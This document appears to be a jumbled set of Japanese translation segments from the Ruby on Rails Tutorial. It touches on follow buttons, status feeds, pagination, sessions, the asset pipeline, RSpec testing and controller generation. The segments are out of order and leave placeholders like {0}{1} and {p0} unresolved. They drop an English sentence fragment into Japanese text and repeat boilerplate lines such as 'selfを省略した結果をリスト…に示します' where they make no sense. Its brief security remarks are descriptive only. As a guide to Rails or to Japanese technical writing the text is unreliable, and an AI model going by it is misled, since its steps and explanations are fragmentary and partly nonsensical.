純粋なJavaScriptと異なり、JS-ERbファイルでは組み込みRuby (ERb) を使用できます。\kode{create.js.erb}ファイルでは、フォロー用のフォームを\kode{unfollow}パーシャルで更新し、フォロワーのカウントを更新するのにERbを使用しています (もちろんこれは、フォローに成功した場合の動作です)。
このコードでは\kode{escape_javascript}関数を使用していることに注目してください。この関数は、JavaScriptファイル内にHTMLを挿入するときに実行結果をエスケープする (画面に表示しない) ために必要です。
JavaScript組み込みRubyを使用してフォローのリレーションシップを作成する。
これらのコードにより、ユーザープロファイルを表示して、ページを更新せずにフォローまたはフォロー解除ができるようになったはずです。テストスイートもパスするはずです。
RailsでAjaxを使用するというテーマは奥が深く、かつ進歩が早いので、本書ではほんの表面をなぞったに過ぎません。しかし、本書の他の題材と同様、今後より高度な資料にあたる際に必要な基礎となるはずです。
この機能を実現するには、RailsとRubyの高度な機能の他に、SQLプログラミングの技術も必要です。
{0}図11.18{/0}{1}ステータスフィードが表示されたHomeページのモックアップ。\href{http://railstutorial.org/images/figures/page_flow_home_page_feed_mockup_bootstrap-full.png}{(拡大)}{/1}
selfを省略した結果をリスト\ref{code:full_feed_specs}に示します。
ステータスフィードの最終テスト。
上のメソッドを使用すれば、\kode{user.followed_users}にある各要素の\kode{id}を呼び出し、フォローしているユーザーのidの配列を構成することができます。
ここで、以下のコードを見てみましょう。
ここに記述されているのはナマのSQLなので、\kode{followed_user_ids}はエスケープではなく\emph{内挿 (interpolate) }されることに注意してください
                         WHERE follower_id = :user_id"
Homeページで動作するステータスフィード。\href{http://railstutorial.org/images/figures/home_page_with_feed_bootstrap-full.png}{(拡大)}
このサンプルアプリケーションには、Railsの主要な機能 (モデル、ビュー、コントローラ、テンプレート、パーシャル、フィルタ、検証、コールバック、\kode{has_many}/\kode{belongs_to}/\kode{has_many through}関連付け、セキュリティ、テスティング、展開) が多数含まれています。
\href{http://railstutorial.org/screencasts}{\emph{Ruby on Railsチュートリアル}スクリーンキャスト}。本書に合わせて、完全版のスクリーンキャストを用意してあります。
スクリーンキャスト (英語) は \href{http://railstutorial.org/}{Ruby on RailsチュートリアルWebサイト}(英語版)で購入できます。
RubyとRailsのお勧め書籍。「\href{http://www.amazon.com/gp/product/1430223634}{\emph{Beginning Ruby}}」(Peter Cooper 著)、「\href{http://www.amazon.com/gp/product/1933988657}{\emph{The Well-Grounded Rubyist}}」(David A. Black著)、「\href{http://www.amazon.com/Eloquent-Ruby-Addison-Wesley-Professional-Series/dp/0321584104/}{\emph{Eloquent Ruby}}」(Russ Olsen著)、Rubyをさらに深く学ぶのであれば 「\href{http://www.amazon.com/gp/product/0672328844}{\emph{The Ruby Way}}」(Hal Fulton著) がお勧めです。Railsをさらに深く学ぶのであれば、「\href{http://www.amazon.com/gp/product/0321601661}{\emph{The Rails 3 Way}}」(Obie Fernandez著)と「\emph{Rails 3 in Action} (第2版待ち)」(Ryan Bigg、Yehuda Katz著) がお勧めです。
\href{http://peepcode.com/}{PeepCode}と\href{http://codeschool.com/}{Code School}。PeepCodeのスクリーンキャストとCode Schoolのインタラクティブコースは品質が高いことで知られており、強くお勧めいたします。
他にどんなコールバックがあるのか知りたい場合は、\href{http://api.rubyonrails.org/v4.2.0/classes/ActiveRecord/Callbacks.html}{Rails APIのコールバック} (英語) を読んでみてください。
本チュートリアルでは、「starter tier」というサービスを使用することにします。これは、(執筆時点では) 1日の最大メール数が400通までという制限がありますが、無料で使用することができます。
selfを省略した結果をリスト\ref{code:generated_user_mailer_previews}に示します。
selfを省略した結果をリスト\ref{code:account_activation_preview}に示します。
そのために、テキストエディタで\kode{Gemfile}を開きます
リスト{p0}の{2}Gemfile{/2}を、実際に使用する正確なバージョンのgemに置き換えたものをリスト\ref{code:gemfile_sqlite_version}に示します。
アプリケーションの{0}Gemfile{/0}の内容をリスト{p1}で置き換えたら、{0}bundle install{/0}を実行してgemをインストールします
他にどんなコールバックがあるのか知りたい場合は、\href{http://api.rubyonrails.org/v4.2.0.beta1/classes/ActiveRecord/Callbacks.html}{Rails APIのコールバック} (英語) を読んでみてください。
{0}図3.2{/0} {1}\href{http://0.0.0.0:3000/static_pages/home}{/static_pages/home}にアクセスした結果{/1}
{0}図3.5{/0} {1}作成したAboutページ (\href{http://0.0.0.0:3000/static_pages/about}{/static_pages/about}){/1}
これはリスト\ref{code:title_tests}で使用されていました。
テストの結果を図\ref{fig:home_root_route}に示します。
(実際、\ref{sec:demo_users_resource}や\ref{sec:microposts_resource}でも説明したように、\kode{rails generate}を実行するとルーティングの\kode{routes.rb}ファイルも自動的に変更されるので、これも元に戻さなくてはなりません)。
ステータスフィードで要求される設計はリスト\ref{code:full_feed_test}のテストで明確になったので (このテストにパスすれば良いので)、早速フィードの実装に着手してみましょう。
{0}{1}第11章{/1}{/0}ではただのプロトタイプでしたが (図\ref{fig:home_with_proto_feed_3rd_edition})、リスト\ref{code:from_users_followed_by_final}の実装によって、Homeページで完全なフィードが表示できていることがわかります (図\ref{fig:home_page_with_feed})。
それでは、コンソールで文字列について調べてみましょう。今回は\kode{rails console}の代わりに、短縮版の\kode{rails c}でコンソールを起動します。
たとえば、{0}{1}図1.5{/1}{/0}をもう一度見てみると、コードを80文字以下に抑えるための小さな縦線が右側に見えます。
本書をここまで進めてきた今であれば、上のコードの意味は (たとえ漠然とであっても) 理解できるはずです。\kode{StaticPagesController}クラスは\kode{ApplicationController}を継承しており、\kode{home}メソッド、\kode{help}メソッド、\kode{about}メソッドを備えています。
\kode{{1}リスト 3.6{/1}}の{2}class{/2}というキーワードから、{2}static_pages_controller.rb{/2}は{2}StaticPagesController{/2}という\emph{クラス}を定義していることがわかります。
\ref{sec:generated_static_pages}で説明したように、\kode{home}というアクションは\kode{home.html.erb}というビューに関連付けられます。このビューは\kode{app/views/static_pages}にあるので、ここに\kode{about.html.erb}というファイルを作ればよさそうです。
# トークンを作成する。
\kode{private}キーワード以降で定義されたメソッドはすべて隠蔽されます。
これはリスト\ref{code:before_create_activation_digest}で使用されていました。
selfを省略した結果をリスト\ref{code:account_activation_edit_action}に示します。
これはリスト\ref{code:add_activation_to_users_migration}で使用されていました。
これはリスト\ref{code:preventing_unactivated_logins}で使用されていました。
  else
(リスト\ref{code:log_in_password_resets}と図\ref{fig:forgot_password_link}参照)
selfを省略した結果をリスト\ref{code:password_reset_migration}に示します。
selfを省略した結果をリスト\ref{code:password_reset_form}に示します。
これはリスト\ref{code:password_resets_integration_test}で使用されていました。
リスト\ref{code:password_resets_integration_test}のコードを使用すると、テストコードは \passing になるはずです。
一方で、Userモデルに対する簡単なIn this case, it’s easy to write a short test for the User model, in which we use \kode{following?}
selfを省略した結果をリスト\ref{code:relationships_access_control}に示します。
selfを省略した結果をリスト\ref{code:comment_out_failing_tests}に示します。
ユーザーのindexビュー。
ユーザーインデックス用のスタイル。
複数のユーザーが表示されたユーザーインデックスページにするためには、ブラウザでサインアップページを表示してユーザーを手作業で1人ずつ追加\emph{するという方法もありますが}、せっかくなのでRubyとRakeを使用してユーザーを一気に作成しましょう。
ユーザーインデックスのページネーション。
従って、1ページ目は1から30のユーザー、2ページ目は31から60のユーザーという具合にデータが取り出されます。ページが\kode{nil}の場合、 \kode{paginate}は単に最初のページを返します。
ここで\kode{:page}パラメーターには\kode{params[:page]}が使用されていますが、これは\kode{will_paginate}によって自動的に生成されます。
ユーザーインデックスへのページネーション実装はついに完了しました。でも私は、ここでぜひともある1つの改良を加えてみたいのです。実はRailsにはコンパクトなビューを作成するための素晴らしいツールがいくつもあります。この節ではそれらのツールを使用してインデックスページのリファクタリング (動作を変えずにコードを整理すること) を行うことにします。
完全にリファクタリングされたユーザーインデックス。
ユーザーインデックスはとうとう完了しました。残るは\kode{destroy}だけです。これを実装することで、RESTに準拠した正統なアプリケーションとなります。
最後に、開発用データベースにマイグレーションを行い、テスト用データベースを準備します。
このリクエストは、ユーザー番号17番を管理者に変えてしまいます。ユーザーのこの行為は、少なくとも重大なセキュリティ違反となる可能性がありますし、実際にはそれだけでは済まないでしょう。
まず、ユーザーインデックスページの各ユーザーに削除用のリンクを追加し、続いて管理ユーザーへのアクセスを制限します。
JavaScriptをサポートしないブラウザをサポートする必要がある場合は、フォームと\texttt{POST}リクエストを使用して\texttt{DELETE}リクエストを偽造することもできます。こちらはJavaScriptがなくても動作します。詳細についてはRailsCastの「\href{http://railscasts.com/episodes/77-destroy-without-javascript}{JavaScriptを使用しないで削除する(英語)}」を参照してください。
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
既に、管理者のみがユーザーを削除できるように構成済みです。削除リンクは管理者にしか表示されません。
残念なことに、実はまだ大きなセキュリティホールがあります。ある程度の腕前を持つ攻撃者なら、コマンドラインで\texttt{DELETE}リクエストを直接発行するという方法でサイトの全ユーザーを削除してしまうことができるでしょう。
本チュートリアルが自分にはまだまだ難しいと思う方には、\href{http://learn-rails.com/}{\emph{Learn Ruby on Rails}} (Daniel Kehoe) や\href{http://mbsy.co/7Zdc7}{One Month Rails}を先に学んでおくとよいでしょう。どちらもまったくの初心者を対象としており、\emph{本チュートリアル}よりも敷居が低く設定されています。
もちろん、このような重複 (2回以上フォローすること) が起きないよう、インターフェイス側の実装でも注意を払います(\ref{sec:following})。しかし、ユーザーが何らかの方法で (たとえば\texttt{curl}などのコマンドラインツールを使用して) Relationshipのデータを操作するようなことも起こり得ます。そのような場合でも、一意なインデックスを追加していれば、エラーを発生させて重複を防ぐことができます。
    following
開発中に\href{http://en.wikipedia.org/wiki/SNAFU}{袋小路}に迷い込んでしまった場合でも、これらの機能を使えば元の状態を復元できます。
selfを省略した結果をリスト\ref{code:installing_rails}に示します。
\kode{Users}ではなく\kode{User}としたのはこのためです。
図\ref{fig:login_page_protected_mockup_bootstrap}のように転送させる仕組みを実装したいときは、Usersコントローラの中で\emph{beforeフィルター}を使います。
これはリスト\ref{code:account_activation_and_password_resets}で使用されていました。
リスト\ref{code:test_helper_log_in}のとき
これはリスト\ref{code:edit_update_redirect_tests}で使用されていました。
selfを省略した結果をリスト\ref{code:correct_user_before_filter}に示します。
このコードは、値が\kode{nil}でなければ\kode{session[:return_to]}を評価し、nilであれば与えられたデフォルトのURLを使用します
最初の行は、送信されたメールアドレスを使用して、データベースからユーザーを取り出しています。
とはいうものの今は無理は禁物です。このテストではまたいくつか新しいアイディアを投入する必要もあるので、テスト作成は\ref{sec:layout_link_tests}に回すことにします。
selfを省略した結果をリスト\ref{code:test_helper_sessions}に示します。
selfを省略した結果をリスト\ref{code:add_remember_digest_to_users_generated}に示します。
これはリスト\ref{code:remember_test}で使用されていました。
何でもよい
メソッドを組み込みクラスに追加できる柔軟性の高さのおかげで、純粋なRubyを極めて自然に拡張することができます (もちろん注意して使う必要はありますが)。
cookiesを設定後、移動先のページで以下のようなコードを使用してユーザーを取り出すことができます。
selfを省略した結果をリスト\ref{code:log_in_with_remember}に示します。
selfを省略した結果をリスト\ref{code:forget_test}に示します。
selfを省略した結果をリスト\ref{code:user_model_forget}に示します。
selfを省略した結果をリスト\ref{code:branch_raise}に示します。
これはリスト\ref{code:persistent_sessions_test}で使用されていました。
作成したコードをリスト\ref{code:log_out_with_test_close_browser}に示します
これはリスト\ref{code:test_close_browser}で使用されていました。
NoMethodError: You have a nil object when you didn't expect it!
You might have expected an instance of Array.
The error occurred while evaluating nil.empty?
=> ["User"]
\ref{sec:login_success}では、セッションを操作するために必要なコードをいくつか追加し、ユーザーログインを完成させる予定です。
次に、ログインに成功した場合 (\ref{sec:login_success}) に使用する土台部分を作成します。ここでは、ログインが送信されるたびに、パスワードとメールアドレスの組み合わせが有効かどうかを判定します。
これはリスト\ref{code:nested_hashes}で使用されていました。
次に、図\ref{fig:failed_login_flash_3rd_edition}と図\ref{fig:flash_persistence_3rd_edition}の手順をテストコードで再現する必要があります。
リスト{p0}で{2}create{/2}アクションを定義できたので、\ref{code:login_form_tag}で定義したログインフォームも正常に動作するようになったはずです。
作成したコードをリスト\ref{code:test_helper_digest}に示します
リスト{p0}の{2}digest{/2}メソッドができたので、有効なユーザーを表すユーザーフィクスチャを作成できるようになりました (リスト\ref{code:real_user_fixture})。
リスト\ref{code:a_test_for_valid_submission}のとき
作成したコードをリスト\ref{code:login_after_signup_test}に示します
  x = x + 1
  x += 1
  $ rails console
  >> x = 1
  => 1
  >> x += 1
  => 2
  >> x *= 3
  => 6
  => -1
  => nil
  x = x + 1
  x += 1
  >> 1.year.from_now
  >> 10.weeks.ago
  >> 1.kilobyte
  => 1024
  >> 5.megabytes
  => 5242880
以後この章を進めるにあたり、有用なリソースである\href{http://ruby-doc.org/core-2.0/}{Ruby API}を参照しながら学習することをぜひお勧めします。Ruby APIには高濃縮の情報が詰まっています (少々\emph{濃厚すぎる}とも言えます)。たとえば、Rubyの文字列の詳細を知りたい場合は、Ruby APIエントリの\kode{String}クラスを参照すればよいのです。
\ref{sec:comments_for_various_readers}でも詳しく解説しているとおり、Web開発はまったくの初心者がちょっと頑張っただけで簡単に学べるようなものではありません。
サンプルアプリケーションでBootstrapを使用するための変換作業で、目覚ましい活躍を見せて助けてくれた読者の\href{https://twitter.com/colmtuite}{Colm Tuite}に感謝します。
章の最後に、ユーザーをサイトにログインさせるための重要な一歩を踏み出します。
(\emph{注:}この時点ではわざわざ見に行くほどの仕上がりではありませんが)。
\kode{div}タグのCSSクラス\kode{hero-unit}は、signupボタンの\kode{btn}クラス、\kode{btn-large}クラス、\kode{btn-primary}クラスと同様、Bootstrapにおいて特別な意味を持ちます。
    by Michael Hartl
最近のRailsに追加された機能の中で最も特筆すべき機能のひとつは、CSS、JavaScript、画像などの静的コンテンツの生産性と管理を大幅に強化する「Asset Pipeline」です。
この節では、アセットパイプラインの高度な概要と、アセットパイプラインの一部としてデフォルトで含まれている、\emph{Sass}と呼ばれる素晴らしいCSS生成ツールの使い方について説明します。
 * This is a manifest file that'll automatically include all the stylesheets
 * available in this directory and any sub-directories.
 * application-wide styles to this file and they'll appear at the top of the
 * compiled file, but it's generally better to create a new file per style
 * scope.
これは、プログラマにとっては便利な方法ですが、本番環境にとっては非効率です。それというのも、最小化されていないCSSやJavaScriptファイルを多数インクルードすると、ページの読み込み時間が著しく遅くなるからです (読み込み時間は、ユーザー体験の質に影響を与える重要な指標の1つです)。
一方、Asset Pipelineでは、本番環境に最適化するために、すべてのスタイルシートを1つのCSSファイル (\kode{application.css}) にまとめ、すべてのJavaScriptファイルを1つのJSファイル (\kode{javascripts.js}) にまとめてくれます。さらに、それらのファイルすべてに対して (\kode{lib/assets}や\kode{vendor/assets}のファイルも含め) 不要な空白を取り除く処理を行い、ファイルサイズを\emph{最小化}してくれます。
これにより、Asset Pipelineは、2つの異なった状況に対してそれぞれ最高の環境を提供してくれます。つまり、プログラマーに対しては見やすく分割されたフォーマットのファイルを提供し、本番環境に対しては最適化された1つのファイルを提供してくれます。
この章の終わりまでに、最後のリンクを除き全て実装します。
({0}{1}第8章{/1}{/0}で本格的に実装します)。
/signin
selfを省略した結果をリスト\ref{code:comment_out_footer}に示します。
  Contact Ruby on Rails Tutorial about the sample app at the
今度はテストが成功することを確認してください。
つまり、以下のコードの場合、
他のページについても同様に変更します。
作成したコードをリスト\ref{code:route_tests}に示します
名前付きルートのテスト。
いつもと同様に、今度のテストは赤色 (失敗) になるはずです。
ルート (root) へのルーティングのためのマッピングを追加する。
Capybaraは\emph{Webrat}の後続プロジェクトであり、世界\href{http://en.wikipedia.org/wiki/Capybara}{最大の齧歯類}が名前の由来です。
"Help"
既にお気付きの方もいると思いますが、これまで行なってきた、レイアウト上のリンクのルーティングテストは、そのリンクが実際に正しいページへのリンクになっているかどうかをチェックしていません。
selfを省略した結果をリスト\ref{code:full_title_helper_tests}に示します。
(\kode{spec/helpers}ディレクトリと\kode{application_helper_spec.rb}ファイルの両方を作成する必要があるでしょう)。
これはリスト\ref{code:rspec_utilities_simplified}で使用されていました。
テストスイートを実行して、新しいコードに問題がないことを確認してください。
(この演習を提案し、コードを提供してくれた\href{http://alexchaffee.com/}{Alex Chaffee}に感謝します)。
\kode{full_title}テストヘルパーを単純に \kode{include}で置換する。
この節では、RSpecの最新の機能を使い、テストをより簡潔で洗練されたものにします。
テストの改善方法について、いくつかの例を見てみましょう。
まず、上の3つの例はいずれもルートへのアクセスを含んでいることに気付きます。
\kode{before}ブロックを使用することでこの冗長箇所を除くことができます。
上のコードでは以下を使用しました。
これにより、それぞれの例の前にルートパスへのアクセスを実行します
(\kode{before}メソッドは、別名でもある\kode{before(:each)}で呼ぶこともできます)。
冗長性の原因は他にもあります。
さらに、どちらの例も\kode{page}変数を参照しています。
以下のように、\kode{page}はテストの\emph{主題 (subject) }であることをRSpecに伝えることにより、冗長の原因を排除できます。
次に、以下のように\kode{it}メソッドの変種を使用することにより、コードと記述を1行に収めます。
これらの変更を加えることでHomeページのテストはより簡潔になります。
上のコードは以前より良くなりましたが、まだタイトルのテストが少し長すぎます。
\kode{full_title}メソッドを持つRSpecユーティリティー用ファイル。
\kode{spec/support}ディレクトリはRSpecによって自動的に読み込まれるため、Homeテストは以下のように書くことができます。
Homeページで使用したのと同じ方法で、Help、About、Contactページのテストを単純化することができます。
変更の結果をリスト\ref{code:pretty_page_tests}に示します。
静的ページの端正になったテスト。
サンプルアプリケーションの今後の開発では、そのさらに簡潔なスタイルを可能な限り使用することにします。
本書では、以後サンプルアプリケーションを肉付けすることに専念します。最初に、ユーザー登録、サインイン、サインアウトできるユーザーを追加します。次に、マイクロポストを追加します。最後に、他のユーザーをフォローできるようにします。
続いてGitHubにプッシュしても構いません。
最後にHerokuへ展開することもできます。
RSpecのShared Exampleを使用してテストの冗長性を排除する。
"Home"
本章では、今後のチュートリアルを楽に理解できるように、簡単なサンプルアプリケーションを開発してみます。
最後に、本書ではRSpecを使ったテストを繰り返し実施していきます。ですから、もし途中でよく分からないテストがあったとしても、読み飛ばして先に進むことをお勧めします。1、2章先を読み進めた後に読み返してみると、当初はよく分からなかったテストが、実はとてもシンプルであることを理解できるはずです
(Code Schoolの\href{http://mbsy.co/6VQ8l}{RSpecコース}の履修を検討してみるのもよいでしょう。このコースはRSpecに関する多くの疑問に答えてくれるという読者からの報告もあります)。
今回は、2つの新しいgemを使います。RSpecのためのgemと、RSpecのライブラリのためのgemです。
これはリスト\ref{code:gemfile_rspec}で使用されていました。
このGemfileでは、開発環境とテスト環境で\texttt{rspec-rails}を使うようにしています。このため、開発環境ではRSpec固有のジェネレーターにアクセスすることができます。同様に、テスト環境でもRSpecを使用してテストを実行できるようになります。
Gemfileに記述した\texttt{rspec-rails}が依存関係を解決してくれるため、 個々の環境にRSpec自身を手動でインストールする必要がなくなり、自動的にインストールされるようになります。
同様の理由で、\href{https://github.com/jnicklas/capybara}{Capybara} gemもGemfileに記述しています。これは、英語に近い文法を使って、ユーザーとサンプルアプリケーションの対話的操作をシミュレーションできるGemです{p1}。Capybaraは{3}Selenium{/3}などのgemに依存しています。
Herokuは、開発環境と本番環境とで同じデータベースを使うことを推奨していますが、今回開発するサンプルアプリケーションでは、データベースが異なっていても特に問題はありません。また、SQLiteはPostgreSQLに比べて\emph{極めて簡単に} セットアップできます。
このため、今後は単に\kode{bundle install}を実行するだけで、自動的に本番環境用gemをスキップできるようになります
秘密トークンを動的に生成する。
# Your secret key is used for verifying the integrity of signed cookies.
# If you change this key, all old signed cookies will become invalid!
# Make sure the secret is at least 30 characters and all random,
# no regular words or you'll be exposed to dictionary attacks.
# You can use `rake secret` to generate a secure secret key.
# Make sure your secret_key_base is kept private
# if you're sharing your code publicly.
# Use the existing token.
# Generate a new token and store it in token_file.
次に、\kode{Test::Unit}の代わりにRSpecを使うように、Railsの設定を変更します。
これを行うには、\kode{rails generate rspec:install}を実行します。
リスト\ref{code:gitignore}のとき
本書では今後、このサンプルアプリケーションを使っていくことになるので、\href{https://github.com/new}{GitHub}上にリポジトリを作成し、プッシュしておくと良いでしょう。
もちろん、お望みであれば、この時点でHerokuにデプロイすることもできます。
なお、本書を進める間、アプリケーションを定期的にGitHubにプッシュしたり、Herokuにデプロイすることをお勧めします。
これにより、リモート環境にバックアップを置くことができ、本番環境で発生するエラーをなるべく早期に発見することができます。
ここまでの準備が完了したら、いよいよサンプルアプリケーションの開発を始めましょう。
この節では、後に動的なページを作成するための準備として、最初にRailsの\emph{アクション}と\emph{ビュー}に静的なHTMLだけを含めたものを作成します
最適な方法は状況によって異なり、たとえば\emph{極めて多数}の静的なページを1つのStaticPagesコントローラだけまかなおうとすると重荷になる可能性があります。今回はいくつかの静的なページを作るだけなので、重荷にはなりません。
現在どのディレクトリで作業しているかがわからなくなった場合は、\ref{sec:the_first_application} ({2}{1}図 1.4{/1}{/2})を再度参照して、Rails のディレクトリ構造を確認してください。
Railsのすべてのディレクトリを一覧できるテキストエディタまたはIDEが使用できると非常に便利です。テキストエディタやIDEの細かな使用法は残念ながらそれぞれ異なりますが、どのツールを使ってもRailsアプリケーションのディレクトリを開くことができます。Unix系のシステムでは、ドット\kode{.}でカレントディレクトリを表現できるので、コマンドライン上で以下を実行してRailsアプリケーションの現在のディレクトリを開き、使用するエディタを呼び出してみてください。
  $ cd ~/rails_projects/sample_app
  $ <エディタ名> .
たとえば、Sublime Text でサンプルアプリケーションを開く場合は、以下を実行します。
  $ subl .
Vimの場合は以下を実行します。
Git でバージョン管理をしている場合は、次のコマンドでトピックブランチを作成してください。
Railsには\kode{generate}というスクリプトがあり、このスクリプトにコントローラ名を入力するだけで、この魔法のようなスクリプトがコントローラを作成してくれます。
これより、複数の静的なページを取り扱うStaticPagesコントローラを作成します。
具体的には、HomeページとHelpページ、Aboutページで使用するアクションを作ってみます。
StaticPagesコントローラを生成する。
$ rails generate controller StaticPages home help --no-test-framework
       route  get "static_pages/help"
       route  get "static_pages/home"
一般的なシナリオの1つは、生成したコードを元に戻したい場合です。たとえば、コントローラを生成した後で、もっといいコントローラ名を思い付いた場合などです。
自動生成されたコードを元に戻すためには、新規作成されたファイルを削除するだけではなく、既存のファイルに挿入されたコードも削除する必要があります
(実際、\texttt{routes.rb} ファイルに自動的に追加されたコードも元に戻す必要があります) 。
このようなときは、\texttt{rails destroy}コマンドを実行するだけで元に戻すことができます。
  $ rails generate controller FooBars baz quux
  $ rails destroy  controller FooBars baz quux
  $ rails generate model Foo bar:string baz:integer
  $ rails destroy model Foo
また、\emph{{1}第2章{/1}}でも簡単に紹介しましたが、{2}マイグレーション{/2}の変更を元に戻す方法も用意されています。詳細は{3}{1}第6章{/1}{/3}で説明します。
簡単に言うと、まず以下のコマンドでデータベースのマイグレーションを変更できます。
  $ rake db:migrate
  $ rake db:rollback
  $ rake db:migrate VERSION=0
\kode{config}ディレクトリという名前のとおり、このディレクトリ内にあるファイルは、Railsがアプリケーションの設定を読み込む時に必要になります。
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
StaticPagesコントローラ内の\kode{home}アクションと\kode{help}アクションで使用するルーティング。
\emph{クライアント} (通常、FirefoxやSafariなどのWebブラウザ) と\emph{サーバー} (ApacheやNginxなどのWebサーバー) は、上で述べた4つの基本操作を互いに認識できるようになっています
Railsを含む多くのWebフレームワークは、HTTPの各操作を発展させた\emph{REST アーキテクチャ}の影響を受けています。{1}{2}第2章{/2}{/1}でも簡単に触れましたが、{3}{2}第7章{/2}{/3}では、より深い内容について学びます。
\texttt{GET} は、最も頻繁に使用されるHTTP操作で、主にWeb上のデータを\emph{読み取る}際に使われます。“ページを取得する” という意味のとおり、Webブラウザはgoogle.comやwikipedia.orgのようなWebサイトを開くたびに\texttt{GET}リクエストを送信しています。
Railsアプリケーションでは、\texttt{POST}リクエストは何かを\emph{作成する}ときによく使われます (なお本来のHTTPでは、\texttt{POST}を更新に使ってもよいとしています)。たとえば、ユーザー登録フォームで新しいユーザーを作成するときは、\texttt{POST}リクエストを送信します。
なお、以前のバージョンのRailsでは\texttt{PATCH}ではなく\texttt{PUT}が使用されていました。PUTはRails 4.0でも依然サポートされてはいますが、\texttt{PATCH}の方が\href{http://weblog.rubyonrails.org/2012/2/25/edge-rails-patch-is-the-new-primary-http-method-for-updates/}{意図したHTTPの使用法により適している}ので、新しいアプリケーションではPATCHが推奨されています。
これは、静的なページの集合に対しては、適切なアクションと言えます。言い換えると、RESTアーキテクチャは、あらゆる問題に対して最適な解決方法であるとは限らないということです。
また、山括弧\kode{<}は、\kode{StaticPagesController}が \kode{ApplicationController}というRailsのクラスを\emph{継承}していることを示しています。この後も説明しますが、今回作成したページには、Rails特有の機能が多数使用されています
今回のStaticPagesコントローラにあるメソッドは、以下のようにどちらも最初は空になっています。
どちらのビューも単なるプレースホルダになっています。トップレベルの見出しが\kode{h1}タグの中にあり、関連するファイルへの絶対パスが\kode{p}タグの中に書かれています。
それが終わったら、ページごとに異なるタイトルを表示する、ほんの少しだけ動的なコンテンツを追加します。
次に進む前に、StaticPagesコントローラファイルをGitリポジトリに追加しておきましょう。
\emph{Railsチュートリアル} では、一字一句間違えることなく最初から正確に実装するのではなく、アプリケーションの振る舞いをテストしながら実装する直観的な手法を採用しています。この開発手法は、テスト駆動開発 (Test-Driven Develpment, TDD) から派生した振舞駆動開発 (Behavior-Driven Development, BDD) として知られています。
結合テスト (RSpec では \emph{リクエストspec} と呼んでいます) は、ユーザーがアプリケーションを使う際の一連のアクションをシミュレーションします。
結合テストは、アプリケーションの各ページが正常に動作するかどうかをテストしてくれる強力なツールです。手動でブラウザを操作してテストする必要がなくなり、Capybaraを併用すれば自然言語 (英語) に近い文法でテストを記述する事もできます
テスト駆動開発の定義とは、アプリケーションを開発するときに\emph{最初に}テストを作成し、次にコードを作成することです。
この開発手法に慣れるまでには多少時間がかかるかもしれませんが、一度慣れてしまえば大きなメリットを得られます。
\emph{失敗する}テストを最初に書き、テストにパスするコードを次に実装することで、しかるべき振る舞いがテストによって正しく検証されている、という自信が付きます。
さらに、この「失敗-実装-成功」という開発サイクルは、「\href{http://en.wikipedia.org/wiki/Flow_(psychology)}{フロー体験}」を誘発します。フローに入ることで、コーディングが楽しくなり、開発の生産性も向上します。
また、テストはアプリケーションのコードに対して\emph{クライアント}として振る舞うので、ソフトウェア設計の改良につながることも多くなるでしょう。
ただし、テスト駆動開発がどんな仕事に対しても常に正しい手法であるとは限りません。このことは十分に理解しておいてください。「最初にテストを書くべきである」、「テストはひとつひとつの機能を完全にカバーするべきである」、「すべての箇所をテストすべきである」などのような教条的な主張を正当化できる理由はどこにもありません。
たとえば、与えられた課題の解決法に今ひとつ確信が持てないときは、(テストを書かずに) まず試しにアプリケーションコードだけを書いてみて、どんな解決方法があるのか模索してみる方が良い結果を得られることもあります
(\href{http://en.wikipedia.org/wiki/Extreme_Programming}{エクストリーム・プログラミング (Extreme Programming)} という開発手法では、この模索段階を\emph{スパイク (spike) }と呼んでいます)。
そして解決策が明確になった段階で、テスト駆動開発でコードを清書するという方法もありえます。
この節では、RSpec gemによって提供される\kode{rspec}コマンドを使ってテストを実行します。
テスト駆動開発で最初に書く、\emph{失敗する}テストのことを、一般的なテストツールでは「赤色 (Red)」と表現します (失敗時に表示が赤くなるツールが多いため)。
同様に、次に書く、テストにパスするコードのことを「緑色 (Green)」と表現します。
最後に、必要に応じてコードをリファクタリング (例えば、動作を変えずにコードを改善したり、冗長なコードを削除したりすること) します。
このサイクルのことを「Red/Green/Refactor」と呼びます。
それでは、テスト駆動開発でいくつかのコンテンツをHomeページに追加してみましょう。トップレベルの見出し (\kode{<h1>}) に "\kode{Sample App}" という語を追加する作業もこの中に含まれます。 まず、静的なページに対する結合テスト (request spec) を生成するところから始めましょう。
      invoke  rspec
      create    spec/requests/static_pages_spec.rb
これにより、\kode{spec/requests}ディレクトリに\kode{static_pages_spec.rb}が生成されます。
置き換える文字列は以下を使用します。
Homeページの内容をテストするコード。
これは、Rubyの柔軟性の高さを応用して、RSpecがテスト用の独自言語 (\emph{Domain-Specific Language: DSL}) を定義しているからです。
ここで重要なのは、\emph{RSpecを使うためにRSpec独自の文法を理解する必要はない}ということです。最初のうちは魔法のように見えるかもしれませんが、RSpecやCapybaraは英語に近い形で読めるように設計されています。したがって、本チュートリアルで取り上げるテスト例を読み進めるだけで、英語圏の方ならRSpecの文法を楽に扱えるようになります。
最初の行では、Homeページに対するテストであることを記述しています。
これは単なる文字列であり、好きな文字列を使用できます。RSpecはこの文字列を解釈しないので、人間にとってわかりやすい説明をここに書くようにします。
次の行では、「\kode{/static_pages/home}のHomeページにアクセスしたとき、“Sample App”という語が含まれていなければならない」と記述しています。
最初の行と同様で、RSpec はダブルクォート (") で囲まれた文字列を無視しますので、ここにも人間にとってわかりやすい説明文を書きましょう (訳注: 英語で should have...と書くことで、メソッドのitと整合性が取れます)。
その次の行について説明します。
上の行は、Capybaraの\kode{visit}機能を使って、ブラウザでの\kode{/static_pages/home}URLへのアクセスをシミュレーションします。
その次の行 (上のコード) では、これもCapybaraが提供する\kode{page}変数を使って、アクセスした結果のページに正しいコンテンツが表示されているかどうかをテストしています。
selfを省略した結果をリスト\ref{code:capybara_dsl}に示します。
(\emph{Railsチュートリアル}の第3版を出すときには、新しい\href{https://www.relishapp.com/rspec/rspec-rails/docs/feature-specs/feature-spec}{feature specs}の技法を使用してこの行の追加を不要にすることを計画しています)。
Capybara DSLをRSpecヘルパーファイルに追加する。
# This file is copied to spec/ when you run 'rails generate rspec:install'
今回は、コマンドラインで\kode{rspec}コマンドを実行してみてましょう (なお、\kode{bundle exec}をこのコマンドの前に置くことで、\kode{Gemfile}内で定義された環境でRSpecが実行されるように、明示的に指示することができます{p1})。
筆者は普段、ターミナルやテキストエディタの背景は黒色にしていますが、明るい色の背景の方がスクリーンショットの見栄えが良いので、(一時的に) 明るい背景を使用しています。
これはリスト\ref{code:home_page_passing}で使用されていました。
